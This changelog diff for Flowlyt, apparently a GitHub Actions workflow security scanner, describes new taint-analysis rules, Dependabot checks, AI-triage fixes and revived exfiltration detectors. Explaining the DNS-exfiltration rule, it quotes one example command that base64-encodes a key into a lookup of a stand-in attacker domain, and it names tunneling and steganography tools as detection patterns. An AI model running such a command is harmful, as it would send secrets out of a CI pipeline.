@@ -7,6 +7,302 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ---
 
+## [Unreleased]
+
+### 🕸️ Cross-job taint analysis
+
+Flowlyt now models a workflow's jobs as a dependency graph and propagates taint
+across it, closing a gap that every existing rule missed.
+
+**`CROSS_JOB_TAINT` (CRITICAL)** detects attacker-controlled data written into a
+job output by one job and executed by a dependent job. Neither job is dangerous
+in isolation — the first only reads an issue title into an output, the second
+only echoes a value from `needs` — so a per-step or per-job analysis sees
+nothing. The vulnerability exists in the edge between them, and the consuming
+job is frequently the privileged one, because the pattern is often used
+deliberately to move data from an unprivileged collector into a job holding
+write permissions.
+
+New package `pkg/analysis/jobgraph`:
+
+- builds the `needs:` DAG in O(V + E), tolerating dangling dependencies
+- orders jobs with **Kahn's algorithm**, chosen over a DFS sort because it
+  detects dependency cycles as a by-product; ties break on job ID so the order
+  is deterministic rather than dependent on Go's randomised map iteration
+- propagates taint **in topological order**, which guarantees every input to a
+  job is resolved before the job is examined — so one pass suffices and no
+  iteration to a fixpoint is needed
+- terminates on cyclic `needs:` (GitHub rejects such workflows, but a file on
+  disk can still contain one) and reports nothing for the cyclic component
+
+Taint is traced through arbitrarily long chains, so a value laundered through
+intermediate forwarding jobs is still caught, and findings show the full path
+(`collect → forward → publish`) plus the originating expression.
+
+Precision was prioritised over reach: only known attacker-controllable contexts
+taint (`github.event.issue.*`, `.pull_request.*`, `.comment.*`, `head_ref`, and
+similar), so `github.sha` and `github.event.repository.name` do not. Values
+passed through `env:` — the recommended fix — are not reported, nor are tainted
+outputs no downstream job consumes, nor flows confined to a single job.
+
+Known limitation: taint passing through a third-party action that sets an output
+is not tracked, since the action's definition is not resolved. Composite action
+resolution would close this.
+
+### 🔗 Cross-file resolution
+
+**`CROSS_FILE_TAINT` (CRITICAL)** follows `uses:` into local composite actions
+and reusable workflows, so taint no longer stops at the file boundary. The
+calling workflow looks clean because it only passes a parameter; the callee
+looks clean because it only uses its own declared input. The vulnerability is
+the composition, and no single-file rule can see it.
+
+New package `pkg/analysis/resolve` loads the definition behind a local `uses:`,
+extracts its declared inputs, and reports which of them reach an execution sink.
+Findings name both sides — the caller line, the untrusted source, the resolved
+file, and the line inside that file where execution happens.
+
+Deliberately bounded:
+
+- only repository-local targets are resolved; remote actions would require
+  fetching another repository and are left to the supply chain rules
+- only **composite** actions are followed, since JavaScript and Docker actions
+  execute code that is not readable from the manifest
+- only inputs reaching an execution sink are reported, so an input used as an
+  artifact name is not flagged
+- `uses:` is treated as untrusted repository data: references escaping the
+  repository root (`./../../etc`) are refused rather than followed, so the
+  analyzer cannot be induced to read arbitrary files. There is a test for this.
+
+Definitions are cached per scan, including negative results, because the same
+action is commonly referenced by many workflows in a repository.
+
+### 🤖 AI analysis overhaul
+
+The AI layer produced poor results and a poor experience for three structural
+reasons, all now fixed.
+
+**The model could not see the workflow.** Findings were sent with only a rule ID,
+severity, job/step names, and evidence truncated to 600 characters. Yet the
+prompts asked the model to judge things like "is this action used in a privileged
+job (write permissions, access to secrets)" and "trigger × job permissions × step
+actions" — while the permissions were never in the payload. Asked questions its
+input could not answer, a model guesses, and one that is also asked for a
+confidence score returns confident fabrication.
+
+Each finding now carries:
+
+- the workflow's triggers, showing whether an untrusted actor can reach the code
+- workflow- and job-level `permissions`, with `not set` (inherits a
+  possibly-write repository default) distinguished from `{}` (grants nothing)
+- the job's dependencies and runner
+- the **full** `run:` script and `uses:` clause, not a truncated fragment
+- a numbered source snippet centred on the reported line, marked with `>`
+
+The system prompts were rewritten to reference only evidence that is actually
+supplied, and to instruct the model to return a confidence at or below 0.5 when
+the evidence is insufficient rather than guessing.
+
+**Requests ran one at a time.** `--ai-workers` was documented but had never been
+implemented — no such flag existed, and `AnalyzeFindings` dispatched batches in a
+plain nested loop. A hundred findings meant twenty sequential round-trips, a
+stall of roughly a minute behind a single-line progress indicator. Batches are
+now dispatched concurrently through a worker pool (`--ai-workers`, default 4),
+with results reassembled by batch index so output stays deterministic. In a
+benchmark of eight 50 ms batches, wall time dropped from ~400 ms to ~100 ms.
+
+Timeouts were also restructured. One deadline was previously derived from the
+total finding count, so a slow early batch consumed the budget for every batch
+after it, and the per-finding fallback path inherited an already-exhausted
+deadline. Each batch, and each fallback request, now gets its own.
+
+**The verdict changed nothing.** `AISuggestedSeverity` was stored and written to
+SARIF but never applied, and `AILikelyFalsePositive` never filtered or reordered
+anything: a finding judged a false positive at 95% confidence was reported
+unchanged. Verdicts are now acted on:
+
+- `--ai-fp-confidence` (default `0.8`) sets the threshold; `0` restores
+  annotate-only behaviour
+- confident false positives are **demoted to `INFO`** by default, because a
+  model's judgement should not silently delete a security finding
+- `--ai-suppress-fp` opts into dropping them instead
+- `--ai-apply-severity` lets the model re-rank true positives; an unrecognised
+  severity string is ignored rather than defaulted
+- a summary line reports how many findings were suppressed, demoted, or
+  re-severitied
+
+### ✨ New input type: Dependabot
+
+- Flowlyt now audits `.github/dependabot.yml` as a first-class input type,
+  discovered automatically for both local (`--repo`) and remote (`--url`) scans.
+  Because its schema shares nothing with a CI workflow, it runs through its own
+  parser and rule set rather than being coerced into the workflow model.
+  - `DEPENDABOT_COOLDOWN_MISSING` (MEDIUM) — missing `cooldown`, or one shorter
+    than the recommended 7 days. Package compromises are typically opportunistic
+    and yanked within days, so a cooldown avoids the exposure window entirely.
+  - `DEPENDABOT_INSECURE_EXECUTION` (HIGH) — `insecure-external-code-execution:
+    allow`, which lets a compromised dependency execute inside a Dependabot job
+    that holds repository and private-registry credentials.
+- New `--no-dependabot` flag to skip it. A malformed file warns rather than
+  failing the scan; a repository with no Dependabot config is a normal state and
+  produces no findings.
+
+### 🛡️ New security rules
+
+Supply chain integrity:
+
+- `REF_VERSION_MISMATCH` (HIGH, online) — a SHA-pinned action whose `# vX.Y.Z`
+  comment does not match the commit that tag actually points to. Reviewers judge
+  pins by the comment, so a mismatch is a potent social-engineering vector; it
+  also catches version bumps that updated the comment but not the SHA.
+- `UNPINNED_CONTAINER_IMAGE` (MEDIUM/LOW) — `container:`, `services:`, and
+  `uses: docker://` images not pinned by `@sha256:` digest. Correctly
+  distinguishes registry ports (`registry:5000/app`) from tags.
+- `ARCHIVED_ACTION_SOURCE` (MEDIUM, online) — actions from archived repositories,
+  which can never receive security fixes.
+- `UNPINNED_TOOL_INSTALL` (MEDIUM) — `go install …@latest`, unpinned
+  `cargo install`, `pipx install`, and `npm install -g`.
+- `ADHOC_PACKAGE_INSTALL` (LOW) — dependencies installed outside a committed
+  lockfile.
+
+Credential scope:
+
+- `HARDCODED_CONTAINER_CREDENTIALS` (CRITICAL) — literal registry password in
+  `container.credentials` or `services.<name>.credentials`. Values are redacted
+  in report output.
+- `SECRETS_OUTSIDE_ENV` (MEDIUM) — `${{ secrets.X }}` interpolated directly into
+  a `run:` script instead of passed via `env:`. `GITHUB_TOKEN` is exempt.
+- `GITHUB_APP_TOKEN_MISUSE` (MEDIUM, HIGH when owner-wide) — App installation
+  tokens requested with `skip-token-revoke`, without `repositories:`, or without
+  any `permission-*` narrowing.
+
+Configuration hygiene:
+
+- `INSECURE_URL_SCHEME` (MEDIUM) — plaintext `http://` in `run:`, action inputs,
+  and `env:`. Excludes loopback, link-local, and XML-namespace/licence URLs.
+- `CONCURRENCY_LIMITS_MISSING` (LOW) — externally re-triggerable workflows that
+  do not cancel superseded runs. Schedule- and dispatch-only workflows are out
+  of scope.
+- `MISFEATURE` (LOW/MEDIUM) — `actions/checkout` with `submodules` or `ssh-key`,
+  and `secrets: inherit` on a reusable workflow call.
+- `ANONYMOUS_DEFINITION` (INFO) — workflow with no top-level `name:`.
+- `UNDOCUMENTED_PERMISSIONS` (INFO) — a `write` scope granted with no
+  explanatory comment.
+
+Policy enforcement:
+
+- `FORBIDDEN_USES` (HIGH, **opt-in**) — allowlist/denylist for `uses:` clauses,
+  configured via `rules.forbidden_uses.allow` / `.deny`. Not registered at all
+  until configured.
+
+> `ANONYMOUS_DEFINITION` and `UNDOCUMENTED_PERMISSIONS` are `INFO` severity, so
+> they are hidden at the default `--min-severity LOW`. Use
+> `--min-severity INFO` to see them.
+
+### 🐛 Fixes
+
+- **Finding categories are now consistent.** The engine emitted two extra
+  category values that were impossible to filter on reliably:
+  - `SECRETS_EXPOSURE` (plural) and `SECRET_EXPOSURE` (singular) were both in
+    use for the same concept, across 8 and 7 rules respectively. Code that
+    matched only the singular form — including the recommendation counter in
+    `pkg/report/policy_aware.go` — silently skipped every finding carrying the
+    plural spelling. Both now emit `SECRET_EXPOSURE`.
+  - The advanced injection and exfiltration rules emitted a raw lowercase
+    `"injection"`, which is not a defined category at all, across 10 rules.
+    These now emit `INJECTION_ATTACK`, matching their registered sibling
+    `CREDENTIAL_EXFILTRATION`.
+
+  `rules.SecretsExposure` is retained as a deprecated alias of
+  `rules.SecretExposure` so existing importers still compile. In configuration
+  files, `SECRETS_EXPOSURE` is still accepted for custom rules and normalises to
+  `SECRET_EXPOSURE`.
+
+  **Downstream impact:** if you filter findings by `Category`, you can drop any
+  workaround that matched both spellings. Anything matching the literal strings
+  `SECRETS_EXPOSURE` or `injection` must be updated.
+
+- **Custom rules can now use every category.** `convertCategory` recognised only
+  5 of the 10 categories, so a custom rule declaring `SUPPLY_CHAIN`,
+  `INJECTION_ATTACK`, `ACCESS_CONTROL`, `PRIVILEGE_ESCALATION`, or
+  `DATA_EXPOSURE` was rejected as invalid and silently filed under
+  `MISCONFIGURATION`.
+
+- **Removed two unsupported regex backreferences that panicked on
+  construction.** `NewAdvancedInjectionDetector()` compiled patterns containing
+  `\1`, which Go's RE2 engine rejects, so the constructor panicked outright.
+  This never surfaced in practice only because the detector is not wired into
+  any scan path. The same-variable check in `VARIABLE_INDIRECTION_INJECTION` and
+  the delimiter match in `HEREDOC_INJECTION` are now performed in Go. The
+  heredoc rule additionally no longer relies on `.` matching newlines (which it
+  never did), and correctly treats a quoted delimiter (`<<'EOF'`) as safe.
+
+- **False-positive filter no longer swallows `@latest` findings.** Ignore
+  *strings* were matched with a bare prefix/suffix test, so any finding whose
+  evidence merely ended with the letters `test` was silently discarded — which
+  includes anything referencing `@latest`, `ubuntu-latest`, or `:latest`, since
+  the default ignore list contains `"test"`. This suppressed genuine findings
+  from `UNPINNED_ACTION`, `UNPINNED_CONTAINER_IMAGE`, `UNPINNED_TOOL_INSTALL`
+  and others. Matching now respects word boundaries, so `my_test` still matches
+  while `actions/checkout@latest` no longer does. Use an ignore *pattern*
+  (a regex) if you need the old substring behaviour.
+
+### ♻️ Activated previously dead detection code
+
+Ten rules existed in the source but were unreachable — the detectors that emit
+them were never constructed, so they had never produced a finding. Each was
+assessed against the rules that actually run, and the code was rewritten rather
+than simply wired up.
+
+**Five now ship**, covering techniques nothing else detected:
+
+- `DNS_EXFILTRATION` (HIGH) — data encoded into a DNS query: a hostname built by
+  command substitution, an expression used as a subdomain label, or a
+  DNS-over-HTTPS resolver carrying an expression. The existing exfiltration rule
+  only matched simple `$VAR` interpolation, so `nslookup "$(cat key | base64).evil.example"`
+  passed cleanly.
+- `STEGANOGRAPHIC_EXFILTRATION` (MEDIUM) — `steghide embed` and friends, and
+  secrets written into image metadata. Previously undetected entirely.
+- `COVERT_CHANNEL_EXFILTRATION` (MEDIUM) — ICMP hex payloads, sleep durations
+  derived from untrusted input, and expression-derived transfer sizes.
+  Previously undetected entirely.
+- `HEREDOC_INJECTION` (HIGH) — an unquoted heredoc whose body interpolates an
+  expression. A quoted delimiter (`<<'EOF'`) is correctly treated as safe.
+- `MULTI_STAGE_INJECTION` (HIGH) — an expression written to a file that is later
+  executed. Requires the *same* path, so writing a log and running an unrelated
+  script is not reported.
+
+**Five were dropped as redundant.** `OBFUSCATED_BASE64_INJECTION`,
+`VARIABLE_INDIRECTION_INJECTION` and `COMMAND_SUBSTITUTION_INJECTION` fired on
+lines already reported by `INJECTION_VULNERABILITY`, `SHELL_INJECTION`,
+`SHELL_EVAL_USAGE` and `MALICIOUS_BASE64_DECODE`; a second rule on the same line
+adds noise, not information. `TUNNELING_EXFILTRATION` and `ENCODED_EXFILTRATION`
+were largely covered by `MALICIOUS_DATA_EXFILTRATION`, so its patterns were
+extended instead to close the remaining holes (`bore local`, localtunnel's `lt
+--port` alias, and hex / URL-encoded pipes to the network).
+
+The detectors were rebuilt on a shared, table-driven scanner. A technique is now
+declared as data — patterns plus metadata — and the scanner supplies comment
+stripping, line pinpointing, and deduplication, so covering a new technique is a
+single table entry rather than a new bespoke scanning loop. Findings now carry
+the correct file path and an exact line number within the `run:` block, which
+the original code did not (it hardcoded line 0 and used the workflow *name* as
+the path).
+
+### 🔧 Internal
+
+- `parser.Workflow` and `parser.Job` now parse the `concurrency:` field, which
+  was previously discarded.
+- Severities and categories in the advanced injection and exfiltration rules now
+  use the typed constants instead of raw string literals, and are covered by a
+  test asserting that every registered rule uses a defined category and
+  severity.
+- New GitHub API helpers: `ResolveRefSHA` (dereferences annotated tags to their
+  target commit), `IsRepositoryArchived`, and `GetFileContent` (treats a missing
+  file as a normal outcome rather than an error).
+
+---
+
 ## [2.0.1] - 2026-06-09
 
 ### 💅 CLI output
